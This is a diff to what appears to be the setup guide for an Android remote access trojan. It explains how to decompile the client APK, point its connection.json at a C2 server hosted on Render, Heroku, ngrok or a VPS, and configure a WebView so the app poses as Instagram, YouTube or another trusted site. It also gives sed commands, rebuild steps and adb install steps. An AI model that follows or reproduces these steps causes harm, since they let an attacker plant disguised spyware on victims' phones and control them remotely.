@@ -401,51 +401,74 @@ apktool d CLIENT_src.apk -o CLIENT_decompiled
 
 ---
 
-### Step 2: Edit Server URL
+### Step 2: Edit Configuration Files
 
-The server URL is located in **`assets/connection.json`**:
+The APK has **two configuration files** in the `assets/` folder:
+
+#### File 1: `assets/connection.json` (Server URL)
+
+This connects the app to your C2 server:
 
 ```bash
-# Open the connection config file
 nano CLIENT_decompiled/assets/connection.json
 ```
 
-**Current content:**
-```json
-{
-  "host": "https://07f1-2401-4900-33c9-68b9-2-2-3ed-a37a.ngrok-free.app/"
-}
-```
-
-**Change to your server URL:**
+**Content:**
 ```json
 {
   "host": "https://your-app.onrender.com/"
 }
 ```
 
-#### Examples:
+#### File 2: `assets/ui.json` (App UI WebView)
 
-| Deployment | URL Format |
-|------------|------------|
-| Render.com | `https://kalirat-bot.onrender.com/` |
-| Heroku | `https://your-app.herokuapp.com/` |
-| Railway | `https://your-app.up.railway.app/` |
-| VPS | `https://your-domain.com/` or `http://YOUR_IP:3000/` |
-| Ngrok | `https://xxxx-xx-xx-xx-xx.ngrok-free.app/` |
+This controls what website is displayed in the app's UI (disguise):
 
-**Important:** Always include the trailing slash `/` at the end of the URL.
+```bash
+nano CLIENT_decompiled/assets/ui.json
+```
+
+**Content:**
+```json
+{
+  "webviewUrl": "https://www.instagram.com"
+}
+```
+
+You can change this to any website to disguise the app:
+
+| Disguise | URL |
+|----------|-----|
+| Instagram | `https://www.instagram.com` |
+| Facebook | `https://www.facebook.com` |
+| YouTube | `https://www.youtube.com` |
+| Google | `https://www.google.com` |
+| Game Site | `https://www.example-game.com` |
+| Custom | Any URL you want |
+
+---
+
+### Configuration Summary
+
+| File | Purpose | Example |
+|------|---------|---------|
+| `assets/connection.json` | C2 Server URL | `{"host": "https://your-app.onrender.com/"}` |
+| `assets/ui.json` | App UI/Disguise | `{"webviewUrl": "https://www.instagram.com"}` |
 
 ---
 
 ### Quick Edit Commands
 
 ```bash
-# One-liner to replace URL (Termux/Linux)
-sed -i 's|https://07f1-2401-4900-33c9-68b9-2-2-3ed-a37a.ngrok-free.app/|https://your-server.onrender.com/|g' CLIENT_decompiled/assets/connection.json
+# Edit connection.json (Server URL)
+sed -i 's|https://07f1-2401-4900-33c9-68b9-2-2-3ed-a37a.ngrok-free.app/|https://your-app.onrender.com/|g' CLIENT_decompiled/assets/connection.json
 
-# Verify the change
+# Edit ui.json (Change app disguise)
+sed -i 's|https://www.instagram.com|https://www.youtube.com|g' CLIENT_decompiled/assets/ui.json
+
+# Verify changes
 cat CLIENT_decompiled/assets/connection.json
+cat CLIENT_decompiled/assets/ui.json
 ```
 
 ---
@@ -578,15 +601,21 @@ adb install CLIENT_signed.apk
 # 1. Decompile
 apktool d CLIENT_src.apk -o CLIENT_decompiled
 
-# 2. Edit server URL in assets/connection.json
+# 2. Edit config files in assets/
+# Server URL:
 nano CLIENT_decompiled/assets/connection.json
-# Change: {"host": "https://your-app.onrender.com/"}
+# {"host": "https://your-app.onrender.com/"}
+
+# App UI (optional):
+nano CLIENT_decompiled/assets/ui.json
+# {"webviewUrl": "https://www.instagram.com"}
 
 # Or use sed for quick replace:
 sed -i 's|https://07f1-2401-4900-33c9-68b9-2-2-3ed-a37a.ngrok-free.app/|https://your-app.onrender.com/|g' CLIENT_decompiled/assets/connection.json
 
-# 3. Verify the change
+# 3. Verify changes
 cat CLIENT_decompiled/assets/connection.json
+cat CLIENT_decompiled/assets/ui.json
 
 # 4. Rebuild
 apktool b CLIENT_decompiled -o CLIENT_modified.apk
@@ -614,7 +643,8 @@ CLIENT_src.apk
 │   ├── layout/              # UI layouts
 │   └── values/              # Strings, colors, styles
 ├── assets/                  # Raw files (configs, databases)
-│   └── connection.json      # ⚡ SERVER URL CONFIG (EDIT THIS!)
+│   ├── connection.json      # ⚡ SERVER URL CONFIG
+│   └── ui.json              # ⚡ APP UI/WEBVIEW CONFIG
 ├── lib/                     # Native libraries (.so files)
 │   ├── armeabi-v7a/
 │   ├── arm64-v8a/
